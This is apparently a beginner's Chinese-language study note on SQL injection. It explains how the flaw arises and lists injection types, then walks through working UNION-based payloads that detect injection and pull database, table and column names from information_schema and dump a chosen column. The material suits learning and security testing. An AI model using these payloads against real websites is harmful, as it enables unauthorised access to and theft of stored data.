（小白笔记分享）

SQL注入指Web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过不同的条件产生不同的SQL语句。

 **SQL注入漏洞的产生需要满足：**

  * 参数用户可控：前端传给后端的参数是用户可以控制的
  * 参数代入数据库查询：传入的参数拼接到SQL语句，且带入数据库查询

 **SQL注入漏洞的分类：**

从注入点区分：

  * 数字型注入
  * 字符型注入

从注入方式区分：

  * 报错注入
  * 延时注入
  * 堆叠注入
  * 布尔注入
  * 宽字节注入

 **数字型注入：**

    
    
    SELECT COLUMN FROM TABLE WHERE ID = id  # MYSQL查询语句

检查是否存在注入:

    
    
    ?id=1 #返回正确
    ?id=1 and 1=1 #返回正确  
    ?id=1 and 1=2 #返回错误

参数周围没有包含引号时，可以传入表达式使其执行。

此时可以初步判断存在数字型注入。

 **字符型注入：**

    
    
    SELECT COLUMN FROM TABLE WHERE ID = 'id'  # MYSQL查询语句

检查是否存在注入：

    
    
    ?id=1 #返回正确
    ?id=1 and 1=1 #返回正确  
    ?id=1 and 1=2 #返回正确
    ?id=1' #返回错误
    ?id=1' and 1=1 --+ #返回正确
    ?id=1' and 1=2 --+ #返回错误

参数周围有引号包裹，传入表达式会被当成字符串处理。

选择闭合引号，然后再注释掉后面的内容。

此时可以初步判断存在字符型注入。

 **简单的SQL注入攻击：**

在此之前，我们需要先了解一些关于MYSQL数据库的知识：

  * 在MYSQL 5.0版本之后，MYSQL默认在数据库中存放一个 information_schema 的数据库。
  * SCHEMATA 表存储该用户创建的所有数据库的库名，该表中记录数据库库名的字段名为 SCHEMA_NAME
  * TABLES 表存储该用户创建的所有数据库的库名和表名，该表中记录数据库库名和表名的字段名为 TABLE_SCHEMA 和 TABLE_NAME
  * COLUMNS 表存储该用户创建的所有数据库库名，表名和字段名的字段名为TABLE_SCHEMA TABLE_NAME ****和 COLUMN_NAME

在我们判断出注入类型之后，需要进一步获取该数据库的信息：

我们首先来猜该表的字段数：(假设x=2)

    
    
    ?id=1 order by x #当x返回错误 x-1返回正确时 该表字段数为x-1

然后我们再来获取数据库名：（假设获取到的数据库名为dname）

    
    
    ?id=-1 union select 1,database()

接着我们就可以获取表名：（假设获取到的表名为tname）

    
    
    ?id=-1 union select 1,group_concat(table_name)from information_schema.tables where table_schema='dname'

随后获取字段名：（假设获取到的字段名为cname）

    
    
    ?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='tname'

最后获取到我们需要的信息：

    
    
    ?id=-1 union select 1,group_concat(cname) from database.tname

到这里一次简单的SQL注入就已经完成了。

只是简单了解一下SQL注入的过程。

